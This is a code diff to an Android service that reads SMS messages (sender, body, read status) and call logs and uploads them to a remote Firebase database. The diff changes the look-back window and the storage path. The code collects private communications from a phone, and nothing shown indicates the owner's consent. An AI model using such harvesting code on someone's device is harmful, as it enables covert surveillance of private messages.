@@ -24,7 +24,7 @@ import java.util.Calendar;
  */
 
 public class ReadMessages extends Service {
-    private String fpId,mobileId=null;
+    private String fpId = null,mobileId=null;
     private static final Uri MESSAGE_URI = Uri.parse("content://sms/");
     private static final Uri CALL_LOG_URI = CallLog.Calls.CONTENT_URI;
     private String[] projections=new String[]{"date","address","body","seen"};
@@ -39,7 +39,7 @@ public class ReadMessages extends Service {
     private String order="date DESC";
     private String CALL_order=CallLog.Calls.DATE+" DESC";
     private int selectionLength=Constants.selections.length;
-    final private int DAYS_BEFORE =30;
+    final private int DAYS_BEFORE =7;
 
 
     @Override
@@ -84,6 +84,7 @@ public class ReadMessages extends Service {
                 readMessage(mDatabase);
                 readCallLog(mDatabase);
                 stopSelf();
+
             }
         }).start();
         return Service.START_NOT_STICKY;
@@ -155,7 +156,7 @@ public class ReadMessages extends Service {
         }
     }
 
-   /* private void addCallBack(DatabaseReference messageIdRef) {
+    /*private void addCallBack(DatabaseReference messageIdRef) {
         messageIdRef.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot dataSnapshot) {
@@ -173,18 +174,26 @@ public class ReadMessages extends Service {
 
     private void readMessage(DatabaseReference mDatabase){
         ContentResolver resolver = getContentResolver();
+        Calendar calendar = Calendar.getInstance();
+        String currentTime = String.valueOf(calendar.getTimeInMillis());
+
+        calendar.add(Calendar.DATE,-DAYS_BEFORE);
+
+        //String selection1 = /*selection+" AND*/ "date"+">="+calendar.getTimeInMillis();
+        //Log.v("ggg",selection1);
         Cursor cursor = resolver.query(MESSAGE_URI,projections,selection,null,order);
             if(cursor!=null && cursor.moveToFirst()){
 
                 PhoneIds phoneIds=new PhoneIds();
-                phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
+                phoneIds.setDate(currentTime);
                 phoneIds.setPhoneId(mobileId);
                 DatabaseReference phoneIdRef = mDatabase.child(fpId+Constants.DETAILS).child(Constants.PHONE_IDS);
                 phoneIdRef.child(mobileId).setValue(phoneIds);
 
                 SmsMessage message;
-                DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.MESSAGES).child(mobileId);
+                DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.MESSAGES);
                 MessageIdRef.removeValue();
+                //addCallBack(MessageIdRef);
                 do{
                     message = new SmsMessage()
                             .setDate(cursor.getLong(0))
@@ -192,6 +201,7 @@ public class ReadMessages extends Service {
                             .setBody(cursor.getString(2))
                             .setSeen(cursor.getString(3));
 
+                    //Log.v("ggg",message.toString());
                     MessageIdRef.push().setValue(message);
 
                 }while(cursor.moveToNext());
